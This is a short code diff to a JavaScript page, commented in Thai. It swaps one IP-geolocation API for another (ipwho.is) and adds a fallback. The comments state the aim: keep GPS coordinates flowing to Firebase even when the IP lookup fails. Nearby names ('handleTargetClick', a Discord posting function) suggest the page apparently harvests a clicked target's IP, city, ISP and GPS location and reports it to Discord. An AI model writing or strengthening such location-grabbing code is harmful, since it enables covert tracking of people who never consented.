@@ -304,11 +304,37 @@ function handleTargetClick() {
       });
     }
 
-    async function fetchIPGeo() {
-      const res = await fetch('https://ipapi.co/json/');
-      if (!res.ok) throw new Error(`IP API ${res.status}`);
-      return res.json();
+   // ฟังก์ชันดึง IP แบบมีระบบสำรอง (ไม่บล็อก Firebase ถ้า API ล่ม)
+async function fetchIPGeo() {
+    try {
+        // เปลี่ยนมาใช้ API ตัวใหม่ที่ฟรีและไม่ค่อยบล็อก 403
+        const response = await fetch('https://ipwho.is/');
+        if (response.ok) {
+            const data = await response.json();
+            if (data.success) {
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country_name: data.country || 'Unknown',
+                    org: data.connection?.isp || 'Unknown'
+                };
+            }
+        }
+    } catch (e) {
+        console.log("Primary IP API failed, using fallback...");
     }
+
+    // ระบบเซฟตี้: ถ้าดึง IP ไม่ได้จริงๆ ให้คืนค่าเป็น Unknown แต่ "ห้ามพัง" เด็ดขาด
+    // เพื่อเปิดทางให้ระบบ GPS และ Firebase ทำงานส่งข้อมูลพิกัดต่อได้!
+    return {
+        ip: "Hidden/Blocked IP",
+        city: "Unknown",
+        region: "Unknown",
+        country_name: "Unknown",
+        org: "Unknown"
+    };
+}
 
     // ===== DISCORD =====
     function postDiscord(payload) {
